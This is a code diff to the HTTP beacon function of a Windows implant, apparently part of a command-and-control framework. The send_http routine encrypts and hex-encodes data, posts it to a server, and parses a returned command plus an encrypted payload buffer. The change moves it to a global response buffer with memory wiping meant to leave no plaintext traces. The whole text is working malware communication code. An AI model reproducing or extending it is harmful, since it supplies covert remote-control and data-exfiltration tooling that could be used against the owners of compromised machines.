@@ -30,18 +30,17 @@
 #include "byte_mod.h"
 #include "houdini.h"
 
+char* temp = (char*)malloc(max_server_resp_size);
+
 command_struct send_http(char * data, LPCWSTR path)
 {
 	const int len = strlen(data);
-	char temp[10000];
 	encrypt(data, temp, len, secret);
 	std::string dataToSend = hexStr(temp, len);
+	memset(temp, 0, max_server_resp_size);
 
 	command_struct received_command;
 	LPSTR pszOutBuffer = "";
-	int server_resp_size = 10000000;
-	LPSTR server_resp = (char*)malloc(server_resp_size);
-	server_resp[0] = '\x00';
 	DWORD dwSize = 0;
 	DWORD dwDownloaded = 0;
 	BOOL  bResults = FALSE;
@@ -102,8 +101,11 @@ command_struct send_http(char * data, LPCWSTR path)
 		printf("Something went wrong while sending the request: Error %d\n", GetLastError());
 #endif
 
+	dataToSend.clear();
+
 	if (bResults)
 	{
+		int received_bytes = 0;
 		do
 		{
 			dwSize = 0;
@@ -139,10 +141,11 @@ command_struct send_http(char * data, LPCWSTR path)
 			}
 			else
 			{
-				strcat_s(server_resp, server_resp_size, pszOutBuffer);
+				strcat_s(temp, max_server_resp_size, pszOutBuffer);
 				memset(pszOutBuffer, 0, dwSize);
 			}
 
+			ZeroMemory(pszOutBuffer, dwSize + 1);
 			delete[] pszOutBuffer;
 
 			if (!dwDownloaded)
@@ -150,40 +153,27 @@ command_struct send_http(char * data, LPCWSTR path)
 
 		} while (dwSize > 0);
 
-		int response_size = strlen(server_resp);
-		LPSTR temp = (char *)malloc(response_size + 1);
-		strncpy_s(temp, response_size + 1, server_resp, response_size);
-		std::string server_resp_string = std::string(temp);
-		int command_end = server_resp_string.find(command_seperator);
-		if (command_end < 1)
+		char* separator_p = strstr(temp, command_seperator);
+		if (!separator_p)
 			return received_command;
-		received_command.command = new char[command_end + 1];
-		strncpy_s(received_command.command, command_end + 1, server_resp_string.substr(0, command_end).c_str(), command_end);
 
-		int buffer_size = 0;
-		int buffer_offset = command_end + strlen(command_seperator);
+		char * buffer_p = separator_p + strlen(command_seperator);
+		// string terminator for the cmd string and clearing separator
+		memset(separator_p, 0, strlen(command_seperator));
+		received_command.command = temp;
+		int decoded_buffer_size = strlen(buffer_p) / 2;
+		received_command.buffer = new char[decoded_buffer_size + 1];
+		received_command.buffer_size = decoded_buffer_size;
+		hex2bin(buffer_p, received_command.buffer);
 
-		if (response_size > buffer_offset + 1){
-			int buffer_offset = command_end + strlen(command_seperator);
-			buffer_size = response_size - buffer_offset;
-
-			int decoded_buffer_size = buffer_size / 2;
-
-			received_command.buffer = new char[decoded_buffer_size + 1];
-			received_command.buffer_size = decoded_buffer_size;
-			hex2bin(server_resp_string.substr(buffer_offset).c_str(), received_command.buffer);
-
-			// Decryption is only done in-place at the very last moment, to prevent
-			// any unencrypted data to remain somewhere in heap/stack/...
+		// Decryption is only done in-place at the very last moment, to prevent
+		// any unencrypted data to remain somewhere in heap/stack/...
 
 #ifdef _DEBUG
 			printf("Implant received encrypted/encoded command '%s' with a payload size of %d\n", received_command.command, received_command.buffer_size);
 #endif
-		}
 
-		//TODO clean memory
-		free(server_resp);
-		free(temp);
+		memset(buffer_p, 0 , strlen(buffer_p));
 		//TODO try/catch
 	}
 	else
